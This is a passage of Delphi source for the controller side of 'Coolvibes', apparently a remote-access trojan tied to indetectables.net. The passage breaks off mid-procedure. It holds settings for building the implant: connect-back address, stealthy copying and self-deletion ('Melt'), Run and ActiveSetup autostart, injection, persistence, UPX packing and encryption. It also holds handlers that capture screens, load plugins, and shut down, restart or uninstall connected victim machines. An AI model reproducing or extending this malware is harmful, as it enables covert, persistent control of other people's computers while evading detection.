        FormOpciones.Pluginadd(Copy(TempStr, 1, Pos('|', TempStr) - 1));
        Delete(TempStr, 1, Pos('|', TempStr));
      end;

    //Valores de la Form de Configuracion del server
    with FormConfigServer do
      begin
        EditID.Text :=
          Ini.ReadString('ConfigurarServidor', 'ID', 'CoolID');
        IPsyPuertos :=
          Ini.ReadString('ConfigurarServidor', 'Conectar', '127.0.0.1:3360�');
        EditPluginName.Text :=
          Ini.ReadString('ConfigurarServidor', 'NombrePlugin', '0k3n.dat');
        CheckBoxCopiar.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'CopiarArchivo', False);
        EditFileName.Text :=
          Ini.ReadString('ConfigurarServidor', 'NombreArchivo', 'coolserver.exe');
        EditCopyTo.Text :=
          Ini.ReadString('ConfigurarServidor', 'RutaCopiarA', '%AppDir%\');
        CheckBoxMelt.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'Melt', False);
        CheckBoxCopiarConFechaAnterior.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'CopiarConFechaAnterior', False);
        CheckBoxRun.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'MetodoRun', False);
        CheckBoxActiveSetup.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'MetodoActiveSetup', False);
        EditRunName.Text :=
          Ini.ReadString('ConfigurarServidor', 'ValorRun', 'coolserver');
        EditActiveSetup.Text :=
          Ini.ReadString('ConfigurarServidor', 'ValorActiveSetup', '');
        CheckBoxInyectar.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'Inyectar', False);
        CheckBoxPersistencia.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'Persistencia', False);
        CheckBoxUPX.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'ComprimirUPX', False);
        CheckBoxCifrar.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'Cifrar', False);
        CheckBoxEscribirADisco.Checked :=
          Ini.ReadBool('ConfigurarServidor', 'EscribirADisco', False);
      end;

    for i := 0 to listviewconexiones.columns.Count - 1 do
      begin
        c := listviewconexiones.columns[searchcolumnbyid(i)];
        c.Index := Ini.ReadInteger('AparienciaCliente', 'Columna' + IntToStr(i) + 'Index', c.Index);

        if Ini.ReadInteger('AparienciaCliente', 'Columna' + IntToStr(i) + 'Width', 100) = -1 then
          begin
            c.MaxWidth := 1;
            PopupMenuColumnas.Items[i].Checked := False;
            c.Width := 0;
          end
        else
          begin
            c.Width := Ini.ReadInteger('AparienciaCliente', 'Columna' + IntToStr(i) + 'Width', 100);
            PopupMenuColumnas.Items[i].Checked := True;
          end;
      end;
    {Apraciencia de las forms}
    Self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth', Self.Width);
    Self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight', Self.Height);
    ControlWidth := Ini.ReadInteger('AparienciaCliente', 'FormControlWidth', ControlWidth);
    ControlHeight := Ini.ReadInteger('AparienciaCliente', 'FormControlHeight', ControlHeight);
    FormOpciones.Width := Ini.ReadInteger('AparienciaCliente', 'FormOpcionesWidth', FormOpciones.Width);
    FormOpciones.Height := Ini.ReadInteger('AparienciaCliente', 'FormOpcionesHeight', FormOpciones.Height);
    FormConfigServer.Width := Ini.ReadInteger('AparienciaCliente', 'FormConfigServerWidth', FormConfigServer.Width);
    FormConfigServer.Height := Ini.ReadInteger('AparienciaCliente', 'FormConfigServerHeight', FormConfigServer.Height);

  finally
    Ini.Free;
  end;
  FormOpciones.BtnGuardar.Click;
end;

procedure TFormMain.GuardarArchivoINI();
var
  Ini: TIniFile;
  i: Integer;
  TempStr: string;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');

    //Valores de la Form de Opciones
    Ini.WriteString('Opciones', 'Plugins', FormOpciones.Plugins);
    Ini.WriteString('Opciones', 'PuertoEscucha', FormOpciones.EditPuerto.Text);
    Ini.WriteBool('Opciones', 'PreguntarSalir',
      FormOpciones.CheckBoxPreguntarAlSalir.Checked);
    Ini.WriteBool('Opciones', 'MinimizarAlTray',
      FormOpciones.CheckBoxMinimizeToTray.Checked);
    Ini.WriteBool('Opciones', 'CerrarAlTray', FormOpciones.CheckBoxCloseToTray.Checked);
    Ini.WriteBool('Opciones', 'NotificacionMsn',
      FormOpciones.CheckBoxNotificacionMsn.Checked);
    Ini.WriteBool('Opciones', 'NotiMsnServerDesc',
      FormOpciones.CheckBoxNotiMsnDesc.Checked);
    Ini.WriteBool('Opciones', 'MandarPingAuto',
      FormOpciones.CheckBoxMandarPingAuto.Checked);
    Ini.WriteBool('Opciones', 'EscucharAlIniciar',
      FormOpciones.CheckBoxEscucharAlIniciar.Checked);
    Ini.WriteString('Opciones', 'PingTimerInterval', FormOpciones.EditPingTimerInterval.Text);
    Ini.WriteBool('Opciones', 'AutoRefrescar',
      FormOpciones.CheckBoxAutoRefrescar.Checked);
    Ini.WriteBool('Opciones', 'CerrarControlAlDesconectar',
      FormOpciones.CheckBoxCerrarControlAlDesc.Checked);
    Ini.WriteBool('Opciones', 'GloboAlPedirServidor',
      FormOpciones.CheckBoxGloboalPedirS.Checked);
    Ini.WriteBool('Opciones', 'AlertaSonora',
      FormOpciones.CheckBoxAlertaSonora.Checked);
    Ini.WriteString('Opciones', 'AlertaSonoraPath', FormOpciones.EditRutaArchivoWav.Text);
    Ini.WriteBool('Opciones', 'CControlIndependiente',
      FormOpciones.CheckBoxCCIndependiente.Checked);
    Ini.WriteBool('Opciones', 'IncluirTreeViewArchivos',
      FormOpciones.CheckBoxIncluirTreeView.Checked);
    Ini.WriteBool('Opciones', 'IncluirTreeViewCC',
      FormOpciones.CheckBoxTreeViewCC.Checked);
    Ini.WriteString('Opciones', 'PathUsuario', FormOpciones.LabeledEditDirUser.Text);
    Ini.WriteString('Opciones', 'PathCapturas', FormOpciones.LabeledDirScreen.Text);
    Ini.WriteString('Opciones', 'PathWebcam', FormOpciones.LabeledDirWebcam.Text);
    Ini.WriteString('Opciones', 'PathMiniaturas', FormOpciones.LabeledDirThumbs.Text);
    Ini.WriteString('Opciones', 'PathDescargas', FormOpciones.LabeledDirDownloads.Text);
    Ini.WriteBool('Opciones', 'GuardarPluginsADisco',
      FormOpciones.CheckBoxGuardarPluginsEnDisco.Checked);
    Ini.WriteBool('Opciones', 'CheckBoxAyuda1',
      FormOpciones.CheckBoxAyuda1.Checked);
    Ini.WriteBool('Opciones', 'CheckBoxAyuda2',
      FormOpciones.CheckBoxAyuda2.Checked);
    Ini.WriteBool('Opciones', 'CheckBoxAyuda3',
      FormOpciones.CheckBoxAyuda3.Checked);
    Ini.WriteBool('Opciones', 'MostrarPanelInferior',
      FormOpciones.CheckBoxPanelInferior.Checked);
    Ini.WriteBool('Opciones', 'CapturaInferior',
      FormOpciones.CheckBoxCapturaInferior.Checked);
    Ini.WriteBool('Opciones', 'Splash',
      FormOpciones.CheckBoxSplash.Checked);

    //Valores de la Form de Configuracion del server
    Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
    Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
    Ini.WriteString('ConfigurarServidor', 'NombrePlugin',
      FormConfigServer.EditPluginName.Text);
    Ini.WriteBool('ConfigurarServidor', 'CopiarArchivo',
      FormConfigServer.CheckBoxCopiar.Checked);
    Ini.WriteString('ConfigurarServidor', 'NombreArchivo',
      FormConfigServer.EditFileName.Text);
    Ini.WriteString('ConfigurarServidor', 'RutaCopiarA',
      FormConfigServer.EditCopyTo.Text);
    Ini.WriteBool('ConfigurarServidor', 'Melt', FormConfigServer.CheckBoxMelt.Checked);
    Ini.WriteBool('ConfigurarServidor', 'CopiarConFechaAnterior',
      FormConfigServer.CheckBoxCopiarConFechaAnterior.Checked);
    Ini.WriteBool('ConfigurarServidor', 'MetodoRun',
      FormConfigServer.CheckBoxRun.Checked);
    Ini.WriteString('ConfigurarServidor', 'ValorRun',
      FormConfigServer.EditRunName.Text);
    Ini.WriteBool('ConfigurarServidor', 'MetodoActiveSetup',
      FormConfigServer.CheckBoxActiveSetup.Checked);
    Ini.WriteString('ConfigurarServidor', 'ValorActiveSetup',
      FormConfigServer.EditActiveSetup.Text);
    Ini.WriteBool('ConfigurarServidor', 'Inyectar',
      FormConfigServer.CheckBoxInyectar.Checked);
    Ini.WriteBool('ConfigurarServidor', 'Persistencia',
      FormConfigServer.CheckBoxPersistencia.Checked);
    Ini.WriteBool('ConfigurarServidor', 'ComprimirUPX',
      FormConfigServer.CheckBoxUPX.Checked);
    Ini.WriteBool('ConfigurarServidor', 'Cifrar',
      FormConfigServer.CheckBoxCifrar.Checked);
    Ini.WriteBool('ConfigurarServidor', 'EscribirADisco',
      FormConfigServer.CheckBoxEscribirADisco.Checked);

    //Guardamos el estado de las columnas del Tlistview :D
    for i := 0 to Listviewconexiones.columns.Count - 1 do
      begin
        //Ini.WriteString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', Listviewconexiones.columns[i].Caption);

        if listviewconexiones.columns[searchcolumnbyid(i)].MaxWidth <> 1 then
          Ini.WriteInteger('AparienciaCliente', 'Columna' + IntToStr(i) + 'Width', Listviewconexiones.columns[searchcolumnbyid(i)].Width)
        else
          Ini.WriteInteger('AparienciaCliente', 'Columna' + IntToStr(i) + 'Width', -1);

        Ini.WriteInteger('AparienciaCliente', 'Columna' + IntToStr(i) + 'Index', Listviewconexiones.columns[searchcolumnbyid(i)].Index);
      end;

    Ini.WriteInteger('AparienciaCliente', 'FormMainHeight', Self.Height);
    Ini.WriteInteger('AparienciaCliente', 'FormMainWidth', Self.Width);
    Ini.WriteInteger('AparienciaCliente', 'FormControlHeight', ControlHeight);
    Ini.WriteInteger('AparienciaCliente', 'FormControlWidth', ControlWidth);
    Ini.WriteInteger('AparienciaCliente', 'FormOpcionesHeight', FormOpciones.Height);
    Ini.WriteInteger('AparienciaCliente', 'FormOpcionesWidth', FormOpciones.Width);
    Ini.WriteInteger('AparienciaCliente', 'FormConfigServerHeight', FormConfigServer.Height);
    Ini.WriteInteger('AparienciaCliente', 'FormConfigServerWidth', FormConfigServer.Width);

    GroupBoxPanel.Visible := FormOpciones.CheckBoxPanelInferior.Checked;
    ImageDesktop.Visible := FormOpciones.CheckBoxCapturaInferior.Checked;
    Splitter.Visible := GroupBoxPanel.Visible;
  finally
    Ini.Free;
  end;
end;
//Termina Archivo .INI

procedure TFormMain.FormCreate(Sender: TObject);
var
  i: Integer;
begin
  Application.OnMinimize := MinimizeToTrayClick;
  Application.HintColor := TColor($FFD7C1); //un azul clarito
  Application.HintHidePause := 20000; //desaparece a los 20 segundos
  Application.HintPause := 200;

  //Inicializar el icono de la TrayBar
  //Self.DoubleBuffered := true;
  Self.ListViewConexiones.DoubleBuffered := true; //Evita parpadeos

  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.Wnd := Handle;
  TrayIconData.uID := 0;
  TrayIconData.uFlags := NIF_MESSAGE + NIF_ICON + NIF_TIP;
  TrayIconData.uCallbackMessage := WM_ICONTRAY; //el mensaje que deberemos interceptar
  TrayIconData.hIcon := Application.Icon.Handle;
  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool);
  Shell_NotifyIcon(NIM_ADD, @TrayIconData);

  Self.Caption := 'Coolvibes ' + VersionCool + ' Update ' + UpdateNum + ' ::   [ www.indetectables.net ]';
end;

//Para el globo emergente
procedure TFormMain.GloboEmergente(titulo: string; mensaje: string; tipo: Cardinal);
begin
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.uFlags := NIF_INFO;
  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
  TrayIconData.dwInfoFlags := tipo;
  //NIIF_INFO;     //NIIF_ERROR;  //NIIF_WARNING;
  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
  {in my testing, the following code has no use}
  TrayIconData.DUMMYUNIONNAME.uVersion := NOTIFYICON_VERSION;
  Shell_NotifyIcon(NIM_SETVERSION, @TrayIconData);
end;

procedure TFormMain.NotiMsnDesconect(tItem: TListItem);
var
  Mensaje, Titulo: string;
  Item: TListItem;
begin
  item := tItem;
  Mensaje := _('La IP es :') + Item.SubItems[0];
  Titulo := Item.Caption + ' ' + _('Desconectandose');
  GloboEmergente(Titulo, Mensaje, NIIF_ERROR);
end;

procedure TFormMain.Traducir();
var
  Ini: Tinifile;
begin

  Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + '\Recursos\Locale\Idioma.ini');
  Self.Idioma := Ini.ReadString('Idioma', 'Idioma', 'NONE');

  if Self.Idioma = 'NONE' then FormSeleccionarIdioma.ShowModal;
  Ini.WriteString('Idioma', 'Idioma', Self.Idioma);
  Ini.Free;
  //Cargamos los archivos de idioma
  UseLanguage(Formmain.idioma);
  TranslateComponent(Self);
  TranslateComponent(FormAbout);
  TranslateComponent(FormConfigServer);
  TranslateComponent(FormID);
  TranslateComponent(FormOpciones);
  TranslateComponent(FormEstadisticasConexiones);

end;

procedure TFormMain.FormShow(Sender: TObject);
var
  ServerFile: file;
  Tamano: Integer;
begin

  if PrimeraVezQueMeMuestro then
    begin
      Escuchar2.Caption := _('Escuchar');
      WndMethod := ListViewConexiones.WindowProc;
      ListViewConexiones.WindowProc := CheckMesg;
      Traducir();
      StatusBar.Panels[0].Text := _('Estado: No escuchando');
      LeerArchivoINI();
      if FormOpciones.CheckBoxSplash.Checked then
        FormSplash.ShowModal();
      if FormOpciones.CheckBoxEscucharAlIniciar.Checked then
        Escuchar2.Click;
      TimerMandarPing.Interval := StrToIntDef(FormOpciones.EditPingTimerInterval.Text, 30) * 1000;
      TimerMandarPing.Enabled := FormOpciones.CheckBoxMandarPingAuto.Checked;

      if fileexists(extractfiledir(ParamStr(0)) + '\Recursos\coolserver.dll') then
      begin
        FileMode := 0;
        AssignFile(ServerFile, extractfiledir(ParamStr(0)) + '\Recursos\coolserver.dll'); //archivo de CoolServer
        Reset(ServerFile, 1);
        tamano := FileSize(ServerFile);
        SetLength(Servdll, tamano);
        BlockRead(ServerFile, Servdll[1], tamano); //cargado archivo a servdll
        CloseFile(ServerFile);
      end
      else
        MessageDlg(_('CoolServer.dll no existe, no se podr�n mandar servidores'), mtWarning, [mbOK], 0);
      PrimeraVezQueMeMuestro := False;
    end;

end;

procedure TFormMain.TrayMessage(var Msg: TMessage);
var
  p: TPoint;
begin
  case Msg.lParam of
    WM_LBUTTONDOWN:
      begin
        MostrarOcultar1.Click;
      end;
    WM_RBUTTONDOWN:
      begin
        SetForegroundWindow(Handle);
        GetCursorPos(p);
        PopUpMenuTray.Popup(p.x, p.y);
        PostMessage(Handle, WM_NULL, 0, 0);
      end;
  end;
end;

procedure TFormMain.MostrarOcultar1Click(Sender: TObject);
begin
  if PrimeraVezQueMeMuestro then //Aun no se ha mostrado 
    exit;
  if FormMain.Visible then //Ocultar
    MinimizeToTrayClick(Sender) //En esa procedure se esconde la form
  else
    begin //Mostrar
      Application.Restore; {restore the application}
      if WindowState = wsMinimized then
        WindowState := wsNormal; {Reset minimized state}
      Visible := True;
      if not IsWindowVisible(Application.Handle) then
        ShowWindow(Application.Handle, SW_SHOW);
      SetForegroundWindow(Application.Handle); {Force form to the foreground }
    end;
end;

procedure TFormMain.Salir1Click(Sender: TObject);
begin
  FormMain.OnCloseQuery := nil;
  Close;
end;

procedure TFormMain.MinimizeToTrayClick(Sender: TObject);
begin
  Hide;
  {hide the taskbar button}
  if IsWindowVisible(Application.Handle) then
    ShowWindow(Application.Handle, SW_HIDE);
end;

procedure TFormMain.wwwindetectablesnet1Click(Sender: TObject);
begin
  ShellExecute(Handle, 'open', 'http://www.indetectables.net', '', '', SW_SHOW);
end;

procedure TFormMain.TimerMandarPingTimer(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
begin //Mandar Ping cada 30 segundos

  for i := 0 to listviewconexiones.Items.Count - 1 do
    begin
      if ListViewConexiones.Items[i].SubItems.Count > 5 then
        if ((ListViewConexiones.Items[i].SubItems[4] <> '.') and (ListViewConexiones.Items[i].SubItems.Objects[0] <> nil)) then //solo si no estamos mandando ping
          begin
            AThread := TidPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]);
            try
              ConnectionWriteLn(AThread, 'PING');
              ListViewConexiones.Items[i].SubItems.Objects[2] := TObject(GetTickCount());
            except
              Athread.terminate;
            end;
            //Como objeto 2 guardamos una captura del tiempo en milisegundos

          end;
    end;
end;

procedure TFormMain.ListViewConexionesKeyPress(Sender: TObject;
  var Key: Char);
begin
  if key = #13 then Abrir1.Click;
end;

procedure TFormMain.ListViewConexionesColumnRightClick(Sender: TObject;
  Column: TListColumn; Point: TPoint);
begin
  listviewconexiones.PopupMenu := PopupMenuColumnas;
end;

procedure TFormMain.PopupMenuColumnasPopup(Sender: TObject);
begin
  listviewconexiones.PopupMenu := PopupMenuConexiones;
end;

function TFormMain.SearchColumnById(ID: Integer): Integer;
var
  i: Integer;
begin
  Result := 0;
  for i := 0 to listviewconexiones.Columns.Count - 1 do
    begin
      if listviewconexiones.Columns[i].id = ID then
        Result := i;
    end;
end;

procedure TFormMain.Ip1Click(Sender: TObject);
var
  MI: TMenuItem;
begin
  MI := TMenuItem(Sender);
  MI.Checked := not MI.Checked;

  if MI.Checked then
    begin
      listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].MaxWidth := 0;
      listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].Width := 100;
    end
  else
    begin
      listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].Width := 0;
      listviewconexiones.columns[SearchColumnByID(Mi.MenuIndex)].MaxWidth := 1;
    end;
end;

procedure TFormMain.CheckMesg(var aMesg: TMessage); //http://www.delphi-zone.com/2010/11/how-to-prevent-resizing-of-listview-columns/
var
  HDNotify: ^THDNotify;
  NMHdr: pNMHdr;
  iCode: Integer;
  iIndex: Integer;
begin
  case aMesg.Msg of
    WM_NOTIFY:
      begin
        HDNotify := Pointer(aMesg.lParam);

        iCode := HDNotify.Hdr.code;
        if (iCode = HDN_BEGINTRACKW) or (iCode = HDN_BEGINTRACKA) then
          begin
            NMHdr := TWMNotify(aMesg).NMHdr;
            // chekck column index
            iIndex := GetIndex(NMHdr);
            if iindex = -1 then Exit;
            if (PopupMenuColumnas.Items[iindex].Checked = False) then aMesg.Result := 1;
          end
        else
          WndMethod(aMesg);
      end;
    else
      WndMethod(aMesg);
  end;
end;

function TFormMain.GetIndex(aNMHdr: pNMHdr): Integer;
var
  hHWND: HWND;
  HdItem: THdItem;
  iIndex: Integer;
  iResult: Integer;
  iLoop: Integer;
  sCaption: string;
  sText: string;
  Buf: array[0..128] of Char;
begin
  Result := -1;

  hHWND := aNMHdr^.hwndFrom;

  iIndex := pHDNotify(aNMHdr)^.Item;

  FillChar(HdItem, SizeOf(HdItem), 0);
  with HdItem do
    begin
      pszText := Buf;
      cchTextMax := SizeOf(Buf) - 1;
      Mask := HDI_TEXT;
    end;

  Header_GetItem(hHWND, iIndex, HdItem);
  Result := iIndex;
  Exit;
  with ListViewConexiones do
    begin
      sCaption := Columns[iIndex].Caption;
      sText := HdItem.pszText;
      iResult := CompareStr(sCaption, sText);
      if iResult = 0 then
        Result := iIndex
      else
        begin
          iLoop := Columns.Count - 1;
          for iIndex := 0 to iLoop do
            begin
              iResult := CompareStr(sCaption, sText);
              if iResult <> 0 then
                Continue;

              Result := iIndex;
              break;
            end;
        end;
    end;
end;

procedure TFormMain.Cerrar1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin
  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea cerrar todos los servidores seleccionados? Este no se volver� a iniciar si no est�n activos los m�todos de auto-inicio.')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;

  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'SERVIDOR|CERRAR|');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Desinstalar1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin

  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea desinstalar el servidor? �Este ser� removido completamente del equipo!')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'SERVIDOR|DESINSTALAR|');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Actualizar1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin
  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea actualizar los servidores seleccionados? �Se volver� a enviar coolserver.dll!')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;

  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'SERVIDOR|ACTUALIZAR|');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.StatusBarMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
var
  mpt: TPoint;
  j: Integer;
  panel: Integer;
begin
  if not Self.Showing then Exit;
  if not Self.Active then Exit;
  mpt := Mouse.CursorPos;
  mpt := StatusBar.ScreenToClient(mpt);
  panel := -1;
  x := 0;
  for j := 0 to StatusBar.Panels.Count - 1 do
    begin
      x := x + StatusBar.Panels[j].Width;
      if mpt.x < x then
        begin
          panel := j;
          Break;
        end;
    end;
  if panel = 1 then
    statusbar.Cursor := CrHandPoint
  else
    statusbar.Cursor := CrDefault;
end;

procedure TFormMain.StatusBarClick(Sender: TObject);
begin
  if statusbar.Cursor = CrHandPoint then
    FormEstadisticasConexiones.show;
end;

function TFormMain.CrearVentanaControl(Item: TListitem): TObject;
var
  AThread: TIdPeerThread;
  NuevaVentanaControl: TFormControl;
begin
  if Item.SubItems.Objects[1] = nil then
    begin
      Athread := TIdPeerThread(item.SubItems.Objects[0]);
      NuevaVentanaControl := TFormControl.Create(Self, Athread, item);
      Item.SubItems.Objects[1] := NuevaVentanaControl;
    end;
  Result := Item.SubItems.Objects[1];
end;

procedure TFormMain.Capturapantalla1Click(Sender: TObject);
var
  VentanaControl: TFormControl;
  mslistviewitem: TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
      VentanaControl.BtnVerGrandeCap.Click;
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.VuelvaaaveractividadenelPC1Click(Sender: TObject);
var
  mslistviewitem: TListItem;
  tmp: string;
begin
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      tmp := mslistviewitem.subitems[11];
      if Pos('A' {actividad}, tmp) > 0 then
        tmp := StringReplace(tmp, 'A', '', [rfReplaceAll]) //Eliminamos la "A"
      else
        tmp := tmp + 'A';
      mslistviewitem.subitems[11] := tmp;
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Cambiedeventana1Click(Sender: TObject);
var
  mslistviewitem: TListItem;
  tmp: string;
begin
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      tmp := mslistviewitem.subitems[11];
      if Pos('V' {ventana}, tmp) > 0 then
        tmp := StringReplace(tmp, 'V', '', [rfReplaceAll]) //Eliminamos la "A"
      else
        tmp := tmp + 'V';
      mslistviewitem.subitems[11] := tmp;
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Abrirdirectoriousuario1Click(Sender: TObject);
var
  VentanaControl: TFormControl;
  mslistviewitem: TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
      VentanaControl.CrearDirectoriosUsuario;
      ShellExecute(0, 'open', PChar(VentanaControl.DirUsuario), '', PChar(VentanaControl.DirUsuario), SW_NORMAL);

      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.PluginClick(Sender: TObject);
var
  VentanaControl: TFormControl;
  mslistviewitem: TListItem;
begin
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));

      VentanaControl.CargarPlugin((Sender as Tmenuitem).Hint);

      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;


procedure TFormMain.NotificacionesClick(Sender: TObject);
begin
  DesactivarNotificaciones := not DesactivarNotificaciones;
  Notificaciones.Checked := DesactivarNotificaciones;
end;

procedure TFormMain.Apagar1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin

  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea apagar el pc del servidor(es) seleccionado(s)?')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'APAGARPC');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Cerrarsesin1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin

  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea cerrar sesion en el pc del servidor(es) seleccionado(s)?')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'CERRARSESIONPC');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Reiniciar1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin

  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea reiniciar el pc del servidor(es) seleccionado(s)?')), pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'REINICIARPC');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Suspender1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin

  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea suspender el pc del servidor(es) seleccionado(s)?')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'SUSPENDERPC');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Hibernar1Click(Sender: TObject);
var
  i: Integer;
  AThread: TIdPeerThread;
  mslistviewitem: TListItem;
begin

  if MessageBoxW(Handle,
    Pwidechar(_('�Est� seguro de que desea hibernar el pc del servidor(es) seleccionado(s)?')),
    pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) <> idYes then
    Exit;
  mslistviewitem := ListViewConexiones.Selected;
  while Assigned(mslistviewitem) do
    begin
      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
      ConnectionWriteLn(AThread, 'HIBERNARPC');
      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
end;

procedure TFormMain.Opciones1Click(Sender: TObject);
begin
  FormOpciones.ShowModal();
end;

procedure TFormMain.Acercade2Click(Sender: TObject);
begin
  if (FormAbout.Showing <> True) then
    FormAbout.ShowModal;
end;

procedure TFormMain.Configurarservidor1Click(Sender: TObject);
begin
  FormConfigServer.Show;
end;

procedure TFormMain.Escuchar2Click(Sender: TObject);
var
  i: Integer;
  List: TList;
  Athread: TidPeerThread;
  o: Integer;
  Puertos: string;
  Puerto: string;
begin
  Puertos := FormOpciones.EditPuerto.Text;
  NumeroConexiones := 0;
  if Copy(puertos, Length(puertos), 1) <> ';' then
